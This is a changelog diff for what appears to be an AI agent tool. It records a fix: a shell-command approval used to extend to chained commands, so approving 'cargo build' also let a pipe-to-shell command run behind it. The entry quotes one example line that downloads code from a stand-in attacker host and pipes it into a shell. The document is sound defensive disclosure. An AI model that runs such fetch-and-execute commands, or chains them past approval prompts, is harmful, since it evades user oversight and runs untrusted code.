@@ -54,6 +54,20 @@ See [docs/HISTORY.md](docs/HISTORY.md) for the project lineage.
   "use sub-agents liberally": a child's prompt must be self-contained and name
   its deliverable, and a one-file change is the parent's own work.
 
+### Fixed
+
+- **A shell approval no longer covers the rest of a chained command line** — the
+  grouping key resolved only the leading dictionary prefix, so
+  `cargo build && curl https://evil.example/x | sh` keyed as `shell:cargo build`
+  and an `[a]` on `cargo build` silently approved the pipe-to-shell behind it
+  (`command_safety` already called that text `Dangerous`; only the key missed
+  it). Every top-level segment is now named — `shell:cargo build + cargo clippy`
+  — `[a]` records one grant per segment, and a later call is auto-approved only
+  when *every* segment it uses was granted. A command the analyzer calls
+  `Dangerous` (pipe-to-shell, multi-line) gets no family at all: its key is the
+  exact call key, so `[a]` there reads `this exact call` and reuses nothing.
+  See `docs/GUIDE.md` ("Working with Tools").
+
 ## [0.10.0] - 2026-10-15
 
 ### Added
